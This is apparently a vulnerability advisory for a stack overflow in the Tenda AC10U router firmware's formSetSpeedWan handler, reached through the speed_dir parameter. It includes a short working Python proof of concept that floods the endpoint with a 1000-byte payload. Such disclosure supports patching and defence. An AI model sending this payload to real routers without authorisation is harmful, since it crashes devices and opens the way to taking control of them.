## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formSetSpeedWan` function. The `speed_dir` variable receives the `speed_dir` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided  `speed_dir` can trigger this security vulnerability.

![image-20240313212816249](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313212816249.png)

![image-20240313212804638](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313212804638.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSpeedWan"
payload = b"a"*1000


data = {"speed_dir": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313212853014](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313212853014.png)
